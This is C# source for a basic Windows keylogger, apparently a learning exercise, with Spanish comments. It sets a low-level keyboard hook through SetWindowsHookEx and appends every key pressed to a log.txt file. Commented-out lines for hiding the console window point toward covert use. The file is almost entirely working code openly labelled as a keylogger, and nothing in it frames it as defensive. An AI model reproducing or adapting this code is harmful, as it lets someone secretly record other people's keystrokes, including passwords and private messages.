using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;

namespace Keylogger_Code {
    class Program {
        public const int KEY = 13;               // Escucha teclado
        private const int GETKEY = 0x0100;      //Ecucha Tecla precionada
        private static LowLevelKeyboardProc _proc = HookCallBack;
        private static IntPtr _HookId = IntPtr.Zero;
  
          // Delegado
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
       


        // Importanto biblioteclas

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]      //Investigar api de hook
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc ipfn, IntPtr hMod, uint dwThereadId);    // Alterando los eventos de captura del teclado 
                                                                                                                                // Se puede hacer inyection de funcionalidades a los Dll del OS
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]      //Investigar api de hook
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]      //Investigar api de hook
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCore, IntPtr wParam, IntPtr lParam);

        // Biblioteclas importantes
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]      //Investigar api de hook
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]      //Investigar api de hook
        static extern IntPtr GetConsoleWindows();

        // Hide Windows
        const int SW_HIDE = 0;
        [DllImport("user32.dll")]
        static extern bool ShowWindows(IntPtr hWnd, int nCmdShow);

        static void Main(string[] args) {
            // Keylogger básico

          //  var Handle = GetConsoleWindows(); // Abrir consola,

            // Oculta ventana
            // ShowWindows(Handle, SW_HIDE);           // Apuntador, // Oculto = 0 Visible = 1
            _HookId = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_HookId);



        }

        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >=0 && wParam == (IntPtr) GETKEY) {

                int vk_Key = Marshal.ReadInt32(lParam); // Devuelve el valor de una posición en memoria // En int32
                Console.WriteLine((Keys)vk_Key);

                StreamWriter file = new StreamWriter(Application.StartupPath+ @"\log.txt",true);    // True escribe ensima, False, Sobrescribe
                file.Write((Keys)vk_Key + "");
                file.Close();
            }
            return CallNextHookEx(_HookId, nCode,wParam,lParam);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process cursProcesss = Process.GetCurrentProcess())
            using (ProcessModule CurModule = cursProcesss.MainModule) 
            {
                return SetWindowsHookEx(KEY, proc, GetModuleHandle(CurModule.ModuleName), 0);
            }
        
        }


    }
}
